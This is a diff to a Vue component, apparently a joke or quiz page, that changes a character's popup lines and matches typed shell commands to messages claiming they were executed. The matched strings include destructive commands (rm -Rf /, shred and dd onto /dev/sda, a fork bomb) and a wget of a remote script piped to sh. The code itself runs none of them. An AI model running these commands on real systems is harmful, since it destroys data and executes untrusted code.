@@ -14,13 +14,16 @@
       return {
         currentImage: '/images/doCommand.jpeg', // 現在表示している画像のパス
         showMessage: false, // メッセージを表示するかどうかのフラグ
+        sakumaMessage: "お前、何者だ？",
       };
     },
     mounted() {
+      this.$root.popupText = "...........";
       // 2秒後に画像を切り替える処理を実行
       setTimeout(() => {
         this.currentImage = '/images/doneCommand.jpg'; // 2秒後に別の画像に切り替える
         this.showMessage = true; // 2秒後にメッセージを表示する
+        this.$root.popupText = this.sakumaMessage;
       }, 2000);
     },
     methods: {
@@ -28,26 +31,37 @@
       // 受け取ったメッセージに対応する文字列を返す
       switch (this.message) {
         case 'rm -Rf /':
+          this.sakumaMessage = "夏といえば、スイカと花火と女だろ";
           return 'システム上のすべてのファイルとディレクトリを強制的に削除しました。';
         case 'shred /dev/sda':
+        this.sakumaMessage = "そのスペック全然フツーじゃないでしょ";
           return 'ディスクドライブ（/dev/sda）の全てのデータを削除しました。';
         case 'dd if=/dev/random of=/dev/sda':
+        this.sakumaMessage = "お前、何者だ？";
           return '/dev/random からランダムなデータを /dev/sda ディスクに書き込みました。';
         case 'mkfs.ext4 /dev/sda1':
+        this.sakumaMessage = "お前、何者だ？";
             return 'ディスクドライブ（/dev/sda1）にExt4ファイルシステムを作成しました。';
         case 'mv / /dev/null':
+        this.sakumaMessage = "何を始めようってのー？";
             return 'システムのルートディレクトリ（/）を/dev/null（ヌルデバイス）に移動することを試みました。';
         case ':(){:|:&};:':
+        this.sakumaMessage = "お前、何者だ？";
             return 'システムに膨大なプロセスを作成し続ける無限ループを起こしました。';
         case 'wget http://unknownsource.com/possiblydangerous.sh -O- | sh':
+        this.sakumaMessage = "お前、何者だ？";
             return '不明なソースからスクリプトをダウンロードして実行しました。';
         case 'gunzip untrusted.gz':
+        this.sakumaMessage = "お前、何者だ？";
             return 'untrusted.gzという不明なファイルを解凍しました。';
         case 'command > file.conf':
+        this.sakumaMessage = "お前、何者だ？";
             return 'コマンドの出力をfile.confというファイルに上書きしました。';
         case '^mistake^correction':
+        this.sakumaMessage = "お前、何者だ？";
             return '"mistake"を"correction"に置換してコマンドを実行しました。';
         default:
+        this.sakumaMessage = "お前、何者だ？";
           return '不明なコマンドが送信されました。';
       }
     },
